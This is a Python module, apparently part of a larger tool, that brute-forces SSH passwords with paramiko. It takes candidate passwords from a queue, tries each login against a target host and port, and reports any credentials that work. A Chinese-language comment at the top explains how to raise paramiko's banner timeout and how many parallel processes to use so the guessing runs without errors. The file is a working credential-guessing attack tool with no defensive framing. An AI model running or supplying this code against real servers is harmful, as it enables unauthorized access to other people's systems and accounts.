'''
module : ssh
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname=hostname,port=port,username=username,password=password)


重新下载 paramiko 插件源码，解压后，编辑安装目录下的 transport.py 文件：

vim build/lib/paramiko/transport.py

搜索 self.banner_timeout 关键词，并将其参数改大即可，比如改为 300s：

self.banner_timeout = 300

最后，重装 paramiko 即可。

最大进程最好控制在8左右，否则回提示如上的报错
'''


import time
import paramiko

class sshcrack:
    def __init__(self,op,args):
        self.op=op
        self.args=args

    def run(self,inputq,outputq,username):
        while True:
            try:
                passwd=inputq.get(timeout=1)
            except:
                outputq.put(1)
                time.sleep(0.5)
                exit(1)


            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=self.op.host, port=self.op.port, username=username, password=passwd)
                outputq.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            except Exception as e:
                if self.op.verbose!=None:
                    print("%s ----- (Username:%s  Passwd:%s)" %(e,username,passwd))
                else:
                    print("Username:%s  Passwd:%s:" % (username, passwd))


            finally:
                ssh.close()